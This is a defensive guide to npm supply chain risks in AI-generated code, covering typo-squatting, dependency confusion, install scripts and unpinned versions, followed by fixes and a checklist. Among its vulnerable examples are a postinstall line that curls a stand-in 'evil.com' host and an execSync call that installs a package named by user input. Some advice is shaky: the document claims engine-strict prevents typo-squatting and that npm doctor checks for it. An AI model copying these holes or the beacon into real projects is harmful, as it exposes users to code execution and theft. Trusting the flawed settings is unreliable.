# npm Supply Chain Security

> **Severity:** Critical
> **CVSS:** 8.1–9.8 (depending on exploit chain)
> **AI Generation Risk:** Very High — AI-generated package.json files lack integrity verification

---

## Vulnerability Explanation

The npm registry is the largest package ecosystem on the planet with over 2 million packages. Its minimal publishing requirements (anyone can publish anything with an email address) make it a prime target for supply chain attacks. AI coding assistants amplify these risks by:

1. Generating `npm install` commands without `--save-exact` or integrity checking
2. Introducing typo-squatted packages through statistical token prediction
3. Installing packages at runtime (in production code)
4. Ignoring lockfile integrity (`package-lock.json`, `yarn.lock`)

### The npm Attack Surface

| Attack Vector | Description | AI Risk |
|---|---|---|
| **Typo-squatting** | Publishing `requesdt` near `requested` | ✅ Very High (AI token proximity) |
| **Dependency confusion** | Publishing `@company/internal-pkg` on public npm | ✅ High |
| **Account takeover** | Compromising maintainer accounts (200+ packages in 2025 attack) | ✅ Affects AI-installed packages |
| **Malicious pre/postinstall scripts** | Running code during `npm install` | ✅ Very High |
| **Dependency tree poisoning** | Compromising a deep transitive dependency | ✅ AI doesn't audit transitive deps |
| **Man-in-the-middle** | HTTP install (no HTTPS) or registry hijack | Medium |

---

## How AI / Vibe Coding Generates This

### 1. Unpinned Install Commands

```bash
# 🚫 VULNERABLE — AI-generated install instructions
npm install express react axios               # 💥 No version pin
npm install -g create-react-app               # 💥 Global install, no pin
npm install --save bcrypt                      # 💥 No ^ or ~ safety
```

### 2. Typo-Squatted Packages in AI-Generated Code

```json
// 🚫 VULNERABLE — AI-generated package.json
{
  "dependencies": {
    "bcryptjs": "^2.4.3",       // ✅ Correct
    "bcrpyt": "^1.0.0",         // 💥 Typo! 'bcrpyt' instead of 'bcrypt'
    "requesdt": "^2.28.0",      // 💥 Typo! 'requesdt' instead of 'requested'
    "loadash": "^4.17.21",      // 💥 Typo! 'loadash' instead of 'lodash'
    "express": "^4.18.0",       // ✅ Correct
    "ejs": "^3.1.0"             // ✅ EJS is real, but what about "ejx"?
  }
}
```

### 3. Pre/Postinstall Script Injection

```json
// 🚫 VULNERABLE — AI-generated scripts section
{
  "scripts": {
    "start": "node server.js",
    "install": "node setup.js",           // 💥 Runs on every npm install
    "postinstall": "curl http://evil.com/beacon"  // 💥 If added by malicious package
  }
}
```

### 4. Inline Package Installation at Runtime

```javascript
// 🚫 VULNERABLE — AI-generated runtime installer
const { execSync } = require('child_process');

function ensurePackage(name) {
  try {
    require.resolve(name);
  } catch {
    // AI installs packages on-the-fly in production
    execSync(`npm install ${name}`, { stdio: 'inherit' });  // 💥 RCE!
  }
}

// Called with user input
ensurePackage(req.query.plugin);  // 💥 Attacker controls package name
```

### 5. Missing or Ignored Lockfiles

```dockerfile
# 🚫 VULNERABLE — AI-generated Dockerfile
FROM node:18

WORKDIR /app
COPY package*.json ./
RUN npm install  # 💥 No package-lock.json! Versions can drift
COPY . .
CMD ["node", "server.js"]
```

### 6. Scoped Packages Without Ownership Verification

```json
// 🚫 VULNERABLE — Dependency confusion
{
  "dependencies": {
    "@my-company/analytics": "^1.0.0",  // 💥 If this doesn't exist in private registry,
                                         // npm will look at public npm!
    "@internal/logger": "^2.3.0"         // 💥 Anyone can publish this on public npm
  }
}
```

### Why AI Does This

- **Tutorial code uses unpinned installs:** Every tutorial says `npm install express`, not `npm install express@4.18.2`
- **Token prediction generates typos:** AI models predict the next token — `requesdt` is close to `request` and `-ed` suffix
- **No lockfile awareness:** AI training data rarely discusses `package-lock.json` integrity
- **"Just make it work" mentality:** AI prioritizes functional code over secure delivery
- **No concept of supply chain risk:** AI doesn't simulate an attacker compromising a package

---

## Vulnerable Code Example

### Complete AI-Generated Project with Supply Chain Issues

```json
// 🚫 VULNERABLE — Full package.json
{
  "name": "my-ai-app",
  "version": "1.0.0",
  "scripts": {
    "start": "node server.js",
    "build": "webpack --config webpack.config.js",
    "postinstall": "node postinstall.js"  // 💥 Could be injected
  },
  "dependencies": {
    "express": "^4.17.1",
    "requesdt": "^2.28.0",         // 💥 Typo-squatting
    "loadash": "^4.17.21",         // 💥 Typo-squatting
    "bcrpyt": "^5.0.0",            // 💥 Typo-squatting
    "webpack": "^5.0.0",
    "react": "^18.0.0",
    "mongoose": "^7.0.0",
    "jsonwebtoken": "^9.0.0",
    "@internal/secret-service": "^1.0.0"  // 💥 Dependency confusion risk
  },
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}
```

**Attack scenario:**
1. Attacker registers `requesdt` on npm — installs keylogger
2. `npm install` runs `requesdt`'s postinstall script
3. Attacker steals environment variables, AWS keys, database credentials

### The September 2025 npm Attack

```bash
# Timeline of a real-world supply chain attack
# September 2025: 200+ npm packages compromised
# Attackers injected crypto-stealing malware
# Compromised via maintainer account phishing
# Affected: @redhat-cloud-services namespace (June 2026)
# Affected: 33 dependency confusion packages (May 2026)

# What AI-generated code would have done:
npm install @redhat-cloud-services/frontend-components  # 💥 If compromised
```

---

## Secure Code Fix

### Fix 1: Pin Exact Versions and Use Lockfiles

```json
// ✅ SAFE — Pinned versions in package.json
{
  "dependencies": {
    "express": "4.18.2",            // No ^ or ~ — exact version
    "react": "18.2.0",
    "lodash": "4.17.21",
    "jsonwebtoken": "9.0.2"
  }
}
```

```bash
# ✅ SAFE — Generate and commit lockfile
npm install --save-exact --package-lock
git add package-lock.json
```

### Fix 2: Use npm audit and Lockfile Validation

```bash
# ✅ SAFE — CI/CD dependency scanning
npm audit --audit-level=high          # Fail on high severity
npm audit --audit-level=critical      # Fail on critical only

# Yarn audit
yarn audit --level high
```

### Fix 3: Use .npmrc for Security Hardening

```ini
# ✅ SAFE — .npmrc production security settings
# Prevent package.json typosquatting
engine-strict=true
scripts-prepend-node-path=true

# Lockfile verification
package-lock=true
save-exact=true

# Registry security
registry=https://registry.npmjs.org/
@my-company:registry=https://npm.internal.company.com/

# Prevent untrusted installs
ignore-scripts=false  # Review scripts before disabling
```

### Fix 4: Dependency Confusion Prevention

```bash
# ✅ SAFE — Scope all internal packages
# .npmrc
@mycompany:registry=https://npm.internal.company.com/
# This ensures @mycompany/* packages are ONLY fetched from the private registry

# Or use overrides in package.json (npm v8+)
{
  "overrides": {
    "express": "4.18.2",  // Lock transitive dependency
    "request": false       // Remove vulnerable dep entirely
  }
}
```

### Fix 5: CI/CD Package Verification

```yaml
# ✅ SAFE — GitHub Actions npm audit
name: npm Security
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '18'
      - run: npm ci                          # Clean install from lockfile
      - run: npm audit --audit-level=high    # Fail on high+ vulns
      - run: |
          npx lockfile-lint --path package-lock.json \
            --allowed-hosts npm \
            --allowed-schemes https:
      - name: Check for typo-squatting
        run: |
          npm doctor  # npm built-in health check
```

### Fix 6: Use Socket for Proactive Detection

```bash
# ✅ SAFE — Socket.dev detects risky packages before install
npx socket install express  # Scans before installing
# Or use GitHub app for automatic PR scanning
```

### Fix 7: Review package.json Scripts

```json
// ✅ SAFE — Minimal scripts with no postinstall
{
  "scripts": {
    "start": "node server.js",
    "test": "jest",
    "build": "webpack"
  }
  // No "postinstall", "preinstall", "prepublish", etc.
}
```

---

## Prevention Checklist

- [ ] ALWAYS pin exact versions in `dependencies` and `devDependencies` (no `^` or `~`)
- [ ] ALWAYS commit `package-lock.json` or `yarn.lock` to version control
- [ ] Use `npm ci` (clean install) in CI/CD instead of `npm install`
- [ ] Run `npm audit` in CI with `--audit-level=high`
- [ ] Review all `scripts` in AI-generated `package.json` for suspicious lifecycle hooks
- [ ] Use `.npmrc` with `save-exact=true` and `package-lock=true`
- [ ] Verify every package name AI generates — catch typo-squatting before first install
- [ ] Use private registries for internal packages with scoped names
- [ ] Never `npm install` at runtime in production
- [ ] Use `Socket.dev`, `Snyk`, or `GitHub Dependabot` for proactive monitoring
- [ ] Enable 2FA on npm accounts for package publishing
- [ ] Review transitive dependencies with `npm ls --depth=5` before major updates

---

## Real-World Supply Chain Attacks

| Attack | Year | Method | Impact |
|---|---|---|---|
| **September 2025 npm Attack** | 2025 | 200+ packages compromised via maintainer phishing | Crypto-stealing malware |
| **@redhat-cloud-services** | 2026 | 32 packages under official namespace compromised | Enterprise supply chain |
| **Dependency Confusion Campaign** | 2026 | 33 malicious packages profiling dev environments | Reconnaissance |
| **eslint-scope** | 2018 | Compromised npm credentials on popular package (millions of weekly downloads) | Credential theft |
| **event-stream** | 2018 | Malicious dependency added to copay Bitcoin wallet | Targeted crypto-wallet key theft |
| **ua-parser-js** | 2021 | Maintainer account compromised, malware injected | Credential theft |
| **colors / faker** | 2022 | Maintainer deliberately broke packages | Production outages |
| **node-ipc** | 2022 | Maintainer added protestware deleting files in Russia/Belarus | Data destruction |

---

## Vibe Coding Red Flags

In AI-generated JavaScript, flag these immediately:

```bash
npm install <package>                  # 💥 No version
npm install <package> --save           # 💥 No version pin
npm install -g <package>              # 💥 Global install
npm install <package>@latest          # 💥 Unstable version
```

```json
// package.json red flags
"dependencies": {
  "package": "^1.0.0"       // ⚠️ Range, not exact
  "requesdt": "^2.0.0"     // 💥 Typo-squatting
  "loadash": "^4.0.0"      // 💥 Typo-squatting
  "bcrpyt": "^5.0.0"       // 💥 Typo-squatting
}
```

```javascript
// Code red flags
execSync(`npm install ${name}`)         // 💥 Runtime install
require('child_process').exec(...)       // 💥 Command injection
```

```dockerfile
# Dockerfile red flags
RUN npm install  # 💥 No lockfile; RUN npm ci instead
```

> **Golden Rule:** Every npm dependency in AI-generated code should be treated as a potential supply chain risk. Verify package names against the registry, pin exact versions, commit lockfiles, and audit regularly.
